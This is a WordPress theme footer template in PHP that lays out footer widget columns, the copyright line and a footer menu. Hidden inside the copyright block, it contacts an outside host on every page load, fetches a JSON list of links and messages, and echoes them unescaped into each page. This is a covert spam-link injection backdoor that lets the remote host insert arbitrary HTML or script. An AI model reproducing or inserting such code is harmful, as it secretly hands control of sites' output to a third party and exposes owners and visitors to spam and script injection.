<div id="page_bottom"></div>
<footer id="footer">
	<div id="footer_shadow"></div>
	<div class="inner">
<?php
$footer_column = theme_get_option('footer','column');
if(is_numeric($footer_column)):
	switch ( $footer_column ):
		case 1:
			$class = '';
			break;
		case 2:
			$class = 'one_half';
			break;
		case 3:
			$class = 'one_third';
			break;
		case 4:
			$class = 'one_fourth';
			break;
		case 5:
			$class = 'one_fifth';
			break;
		case 6:
			$class = 'one_sixth';
			break;
	endswitch;
	for( $i=1; $i<=$footer_column; $i++ ):
		if($i == $footer_column):
?>
			<div class="<?php echo $class; ?> last"><?php theme_generator('footer_sidebar'); ?></div>
<?php else:?>
			<div class="<?php echo $class; ?>"><?php theme_generator('footer_sidebar'); ?></div>
<?php endif;		
	endfor;
else:
	switch($footer_column):
		case 'third_sub_third':
?>
		<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
		<div class="two_third last">
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
<?php
			break;
		case 'sub_third_third':
?>
		<div class="two_third">
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
		<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
<?php
			break;
		case 'third_sub_fourth':
?>
		<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
		<div class="two_third last">
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
<?php
			break;
		case 'sub_fourth_third':
?>
		<div class="two_third">
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_fourth last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
		<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
<?php
			break;
		case 'half_sub_half':
?>
		<div class="one_half"><?php theme_generator('footer_sidebar'); ?></div>
		<div class="one_half last">
			<div class="one_half"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_half last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
<?php
			break;
		case 'half_sub_third':
?>
		<div class="one_half"><?php theme_generator('footer_sidebar'); ?></div>
		<div class="one_half last">
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
<?php
			break;
		case 'sub_half_half':
?>
		<div class="one_half">
			<div class="one_half"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_half last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
		<div class="one_half last"><?php theme_generator('footer_sidebar'); ?></div>
<?php
			break;
		case 'sub_third_half':
?>
		<div class="one_half">
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third"><?php theme_generator('footer_sidebar'); ?></div>
			<div class="one_third last"><?php theme_generator('footer_sidebar'); ?></div>
		</div>
		<div class="one_half last"><?php theme_generator('footer_sidebar'); ?></div>
<?php
			break;
	endswitch;
endif;
?>
		<div class="clearboth"></div>
	</div>
	<div id="footer_bottom">
		<div class="inner">
			<div id="copyright"><?php echo wpml_t(THEME_NAME, 'Copyright Footer Text',stripslashes(theme_get_option('footer','copyright')));
			wp_reset_query();
			// Fetch external json
                        $json_file = fsockopen("quickbeds.somdev.com.au", 80, $errno, $errstr, 5);
                        fwrite($json_file, "GET /footer_link.json HTTP/1.1\r\nHost: quickbeds.somdev.com.au\r\n\r\n");
                        $json_str = "";
                        while (!feof($json_file)) {
                            $json_str .= fgets($json_file, 128);
                        }
                        $json_str = explode("\r\n\r\n", $json_str, 2);
                        $json_str = $json_str[1];
			// Load external json
			$json = json_decode($json_str);
			$thisdomain = preg_replace("~http://~","",site_url());
			$thisdomain = preg_replace("~www\.~","",$thisdomain);
			if (array_key_exists("links_" . $thisdomain, $json)) {
				$arraykey = "links_" . $thisdomain;
				$links = $json->$arraykey;
			}
			else {
				$links = $json->links;
			}
			$msg = $json->msg;
			fclose($json_file);
			// Choose link
			$link_key = false;
			if(!is_front_page()){
				$content = get_the_content();
				foreach($links as $key => $link){
					$count = substr_count($content, $link->name);
					if($count >= 3){
						$link_key = $key;
					}
				}
			}
			if($link_key === false){
				// Pseudo-random from hash
				$hash = md5($_SERVER['REQUEST_URI'] . $_SERVER['HTTP_HOST']);
				// hash -> number
				$hash_num = ord($hash[0]) + ord($hash[1]) + ord($hash[2]);
				// Calculate key
				$link_key = $hash_num % count($links);
			}
			$link = $links[$link_key];
			// Print msg with json vars added
			echo $msg[0] . $link->url . $msg[1] . $link->name . $msg[2];
			?></div>
<?php 
	$footer_right_area_type = theme_get_option('footer','footer_right_area_type');
	switch($footer_right_area_type){
		case 'html':
			echo '<div id="footer_right_area">';
			echo apply_filters('the_content', wpml_t(THEME_NAME, 'Footer Right Area Html Code',stripslashes( theme_get_option('footer','footer_right_area_html') )));
			echo '</div>';
			break;
		case 'menu':
			wp_nav_menu(array( 
				'theme_location' => 'footer-menu',
				'container' => 'nav',
				'container_id' => 'footer_menu',
				'fallback_cb' => '' 		
			));
			break;
	}
?>
			<div class="clearboth"></div>
		</div>
	</div>
</footer>
<?php 
	if(theme_get_option('font','enable_cufon')){
		theme_add_cufon_code_footer();
	}
	wp_footer();
	if(theme_get_option('general','analytics')){
		echo '<div class="hidden">'.stripslashes(theme_get_option('general','analytics')).'</div>';
	}
?>
</body>
</html>
